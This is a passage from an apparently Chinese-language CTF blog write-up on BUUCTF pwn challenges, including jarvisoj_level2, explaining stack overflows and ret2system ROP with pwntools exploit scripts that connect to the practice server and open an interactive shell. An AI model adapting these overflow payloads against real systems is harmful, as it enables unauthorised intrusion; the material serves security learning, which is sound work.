Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节&#x3D;&#x3D;</p></blockquote><p>所以代码的意思是要将var[13]之后的8个字节的数据赋值为17。</p><h3 id="（2）payload"><a href="#（2）payload" class="headerlink" title="（2）payload"></a>（2）payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29179</span>)<br>p.sendline(p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="10-jarvisoj-level2"><a href="#10-jarvisoj-level2" class="headerlink" title="10.jarvisoj_level2"></a>10.jarvisoj_level2</h2><h3 id="1-解题思路-6"><a href="#1-解题思路-6" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查</p><p><img src="/../images/BUUCTF/image-20230530204940268.png" alt="image-20230530204940268"></p><p>IDA中函数很简单，</p><p>开了NX就不能用shellcode了，另外程序没有开canary（栈溢出检测）、内存地址随机化（PIE），所以用基本的ROP</p><p>找system和\bin\sh地址</p><p><img src="/../images/BUUCTF/image-20230530211058479.png" alt="image-20230530211058479"></p><p>system_addr&#x3D;0x8048320</p><p>shell_addr&#x3D;0x804a024</p><p>buf的大小是0x88，读入的数据大小是0x100，可以溢出0x78个字节</p><h3 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28703</span>)<br>shell_addr=<span class="hljs-number">0x804a024</span><br>system_addr=<span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">8</span>)+p32(shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
